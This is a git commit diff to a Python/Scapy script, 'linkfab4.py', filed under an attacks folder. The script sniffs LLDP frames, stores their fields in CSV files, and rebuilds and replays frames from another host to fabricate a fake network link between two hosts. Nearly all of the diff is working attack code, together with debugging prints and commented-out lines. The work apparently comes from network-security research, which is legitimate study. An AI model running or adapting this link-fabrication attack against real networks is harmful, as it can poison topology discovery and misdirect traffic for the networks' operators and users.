1141d7279ef0ceb1595ce911cb890e96a8eed6fe
julialejah <julianalejandra@gmail.com>
2022-11-09 16:50:53 -0500

    lldp completo menos data

--- pyscripts/attacks/linkfab4.py
+++ pyscripts/attacks/linkfab4.py
@@ -1,10 +1,9 @@
-
-
-
 #! /usr/bin/env python
 #creates a fake link between 2 hosts
 ## Args [1] = name of the second host
 
+from binascii import hexlify
+from termios import B50
 from scapy.contrib.lldp import *
 import sys
 import threading
@@ -35,9 +34,23 @@ def _layer2df(obj):
             value = None
         if not isinstance(value, _native_value):
             value = _layer2df(value)
-        #if type(value) is bytes:
-           # d[f.name] = str(value)
-#            print('type: '+type(str(value).encode()))
+        if type(value) is bytes:
+            print(len(value))
+            print(value)
+            try:
+                aux=int(value)
+                df=df.append({"Layer":str(obj.name),"Field":str(f.name),"Value":aux},ignore_index=True)
+                print("codifico entero")
+            except:
+                try:
+                    hval=value.decode("utf-8")
+                    df=df.append({"Layer":str(obj.name),"Field":str(f.name),"Value":hval},ignore_index=True)
+                    print("codifico utf8")
+                except:
+                    hval=value.hex()
+                    print(hval)
+                    df=df.append({"Layer":str(obj.name),"Field":str(f.name),"Value":hval},ignore_index=True)
+                    print("codifico otro") #.hex()
         else:
              df=df.append({"Layer":str(obj.name),"Field":str(f.name),"Value":str(value)},ignore_index=True)
     return (df)
@@ -56,7 +69,6 @@ def to_dataframe(p):
         cap=_layer2df(layer)
         df = df.append(cap)
         count += 1
-#    print(df)
     return (df)
 
 
@@ -69,16 +81,16 @@ def get_ifa():
     return ifa
 
 def linkfabr(ifa,hostname):
-    print('entra 1')
     lim = 0
     lpc = 0
     lis =[]
     lld =[]  
-    while lim<10 and flag :
+    while lim<5 and flag :
         pkt = sniff(count=1,iface=ifa)[0]
         data = to_dataframe(pkt)
+        print(data)
+        print(data.loc[(data['Layer']=='Ethernet')&(data['Field']=='type')])#.iloc[0,2])
         ethtype = int(data.loc[(data['Layer']=='Ethernet')&(data['Field']=='type')].iloc[0,2])
-        print(ethtype)
         if ethtype == 0x88cc:
             lim = lim + 1
             print('lldp')
@@ -86,21 +98,18 @@ def linkfabr(ifa,hostname):
 
 
 def getlldppack(host_2,ifa):
-    print("entra func thre")
     lim = 1
     log = "/root/log.log"
     file = "/root/dic_"+str(host_2)+"_"+str(lim)+".csv"
-    while lim<10:
-        print(lim)
+    while lim<5:
         try:
             lldp1 = pd.read_csv(file)
         except:
             with open(log,'a') as lf:
-                lf.write("error when reading the packet "+file+"\n")
+                lf.write("error when reading the packet "+file+" for count "+str(lim)+"\n")
             time.sleep(8)
         else:
             lldp1 = lldp1.iloc[: , 1:]
-            print(lldp1) 
 
             e1=lldp1.loc[(lldp1['Layer']=='Ethernet')&(lldp1['Field']=='dst')].iloc[0,2]
             e2=lldp1.loc[(lldp1['Layer']=='Ethernet')&(lldp1['Field']=='src')].iloc[0,2]
@@ -115,48 +124,77 @@ def getlldppack(host_2,ifa):
             b2=int(lldp1.loc[(lldp1['Layer']=='LLDPDUPortID')&(lldp1['Field']=='_length')].iloc[0,2])
             b3=int(lldp1.loc[(lldp1['Layer']=='LLDPDUPortID')&(lldp1['Field']=='subtype')].iloc[0,2])
             b4=lldp1.loc[(lldp1['Layer']=='LLDPDUPortID')&(lldp1['Field']=='family')].iloc[0,2]
-            b5=lldp1.loc[(lldp1['Layer']=='LLDPDUPortID')&(lldp1['Field']=='id')].iloc[0,2]
-            c1=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUTimeToLive')&(lldp1['Field']=='_type')].iloc[0,2],encoding='utf8')
-            c2=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUTimeToLive')&(lldp1['Field']=='_length')].iloc[0,2],encoding='utf8')
-            c3=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUTimeToLive')&(lldp1['Field']=='ttl')].iloc[0,2],encoding='utf8')
-            d1=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUSystemName')&(lldp1['Field']=='_type')].iloc[0,2],encoding='utf8')
-            d2=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUSystemName')&(lldp1['Field']=='_length')].iloc[0,2],encoding='utf8')
-            d3=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUSystemName')&(lldp1['Field']=='system_name')].iloc[0,2],encoding='utf8')
-            e1=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='_type')].iloc[0,2],encoding='utf8')
-            e2=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='_length')].iloc[0,2],encoding='utf8')
-            e3=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='org_code')].iloc[0,2],encoding='utf8')
-            e4=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='subtype')].iloc[0,2],encoding='utf8')
-            e5=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='data')].iloc[0,2],encoding='utf8')
-            f1=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='_type')].iloc[1,2],encoding='utf8')
-            f2=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='_length')].iloc[1,2],encoding='utf8')
-            f3=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='org_code')].iloc[1,2],encoding='utf8')
-            f4=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='subtype')].iloc[1,2],encoding='utf8')
-            f5=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='data')].iloc[1,2],encoding='utf8')
-            g1=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUEndOfLLDPDU')&(lldp1['Field']=='_type')].iloc[0,2],encoding='utf8')
-            g2=bytearray(lldp1.loc[(lldp1['Layer']=='LLDPDUEndOfLLDPDU')&(lldp1['Field']=='_length')].iloc[0,2],encoding='utf8')
-            print("a5 = "+str(a5)+" is type: ")
-            print(type(a5))
-            print("a3 = "+str(a3)+" is type: ")
-            print(type(a3))
-            print("a4 = "+str(a4)+" is type: ")
-            print(type(a4))
-
-
+            b5=int(lldp1.loc[(lldp1['Layer']=='LLDPDUPortID')&(lldp1['Field']=='id')].iloc[0,2])
+            c1=int(lldp1.loc[(lldp1['Layer']=='LLDPDUTimeToLive')&(lldp1['Field']=='_type')].iloc[0,2])
+            c2=int(lldp1.loc[(lldp1['Layer']=='LLDPDUTimeToLive')&(lldp1['Field']=='_length')].iloc[0,2])
+            c3=int(lldp1.loc[(lldp1['Layer']=='LLDPDUTimeToLive')&(lldp1['Field']=='ttl')].iloc[0,2])
+            d1=int(lldp1.loc[(lldp1['Layer']=='LLDPDUSystemName')&(lldp1['Field']=='_type')].iloc[0,2])
+            d2=int(lldp1.loc[(lldp1['Layer']=='LLDPDUSystemName')&(lldp1['Field']=='_length')].iloc[0,2])
+            d3=lldp1.loc[(lldp1['Layer']=='LLDPDUSystemName')&(lldp1['Field']=='system_name')].iloc[0,2]
+            e1=int(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='_type')].iloc[0,2])
+            e2=int(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='_length')].iloc[0,2])
+            e3=int(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='org_code')].iloc[0,2])
+            e4=int(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='subtype')].iloc[0,2])
+            e5=lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='data')].iloc[0,2]
+            f1=int(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='_type')].iloc[1,2])
+            f2=int(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='_length')].iloc[1,2])
+            f3=int(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='org_code')].iloc[1,2])
+            f4=int(lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='subtype')].iloc[1,2])
+            f5=lldp1.loc[(lldp1['Layer']=='LLDPDUGenericOrganisationSpecific')&(lldp1['Field']=='data')].iloc[1,2]
+            g1=int(lldp1.loc[(lldp1['Layer']=='LLDPDUEndOfLLDPDU')&(lldp1['Field']=='_type')].iloc[0,2])
+            g2=int(lldp1.loc[(lldp1['Layer']=='LLDPDUEndOfLLDPDU')&(lldp1['Field']=='_length')].iloc[0,2])
+           
+           
             l1 = LLDPDUChassisID(_type=a1,_length=a2,subtype=a3,family=a4,id=a5)
-            l2 = LLDPDUPortID(_type=b1,_length=b2,subtype=b3,family=b4,id=b5)
+            l2 = LLDPDUPortID(_type=b1,_length=b2,subtype=b3,family=b4,id=str(b5))
             l3 = LLDPDUTimeToLive(_type=c1,_length=c2,ttl=c3)
             l4 = LLDPDUSystemName(_type=d1,_length=d2,system_name=d3)
             l5 = LLDPDUGenericOrganisationSpecific(_type=e1,_length=e2,org_code=e3,subtype=e4,data=e5)
-            l6 = LLDPDUGenericOrganisationSpecific(_type=f1,_length=f2,org_code=f3,subtype=f4,data=f5)
-            l7 = LLDPDUEndOfLLDPDU(_type=g1,_length=g2)
-#            pack = e/l1/l2/l3/l4/l5/l6/l7
-            pack = e/l1/l2
+            
+            print("f2 es: -----> "+str(f2))
+            print("len(f5) es: -----> "+str(len(f5)))
+            n=int(len(f5)/(f2-4))
+            print("n es: "+str(n))
+            if len(f5) > f2-4:
+                parts = [f5[i:i+n].encode('utf-8') for i in range(0, len(f5), n)]
+            print(parts)
+            parts = [ int.from_bytes(parts[i], "little") for i in range (0,len(parts))]    
+            print(parts)
+            print(type(parts))
+            print(len(parts))
+            print("parts[1]: "+str(parts[1]))
+            print(len(parts[1]))
+
+#            auxa_=f5[2:-1]
+#            auxa = hex(f5).hex()
+#            print("--------->"+str(auxa))
+#            print(auxa_)
+#            print("-------", f5)
+#            print(type(f5))
+            auxa = b''.join(parts)
+            print(auxa)
+            print(len(auxa))
+#            print(len(auxa))
+
+
+
+            l6 = LLDPDUGenericOrganisationSpecific(_type=f1,_length=f2,org_code=f3,subtype=f4,data=auxa)
+            l7 = LLDPDUEndOfLLDPDU(_type=0,_length=0)
+            lldpu_layer = LLDPDU()
+            lldpu_layer = l1/l2/l3/l4/l6
+#            lldpu_layer = l1/l2/l3/l4/l6/l7
+            
+            pack = e/lldpu_layer
+            print(pack.show2())
+
             flag = False
             sendp(pack,count=1, iface=ifa)
             flag = True
             lim = lim +1
+
             with open(log,'a') as lf:
                 lf.write('read packet '+file+"\n")
+   
 
 ifa = get_ifa()        
 host_2=sys.argv[1]
@@ -166,3 +204,4 @@ getpack.start()
 hostname = socket.gethostname()
 print(ifa)#ifa = 'enp2s0'
 linkfabr(ifa,hostname)
+print(flag)
